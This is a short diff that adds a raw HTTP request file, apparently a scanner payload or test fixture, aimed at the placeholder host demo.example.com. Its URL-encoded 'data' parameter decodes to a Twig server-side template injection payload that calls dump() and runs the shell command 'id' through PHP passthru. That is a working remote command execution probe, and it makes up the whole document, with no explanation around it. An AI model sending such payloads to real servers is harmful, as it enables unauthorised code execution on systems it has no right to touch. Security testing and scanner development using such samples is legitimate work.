@@ -1,0 +1,4 @@
+GET /a?data=%7B%7B%2Bdump%28%29%2B%7D%7D%7B%7B%2B%5B%27id%27%5D%7Cmap%28%27passthru%27%29%2B%7D%7D HTTP/1.1
+Host: demo.example.com
+Connection: close
+
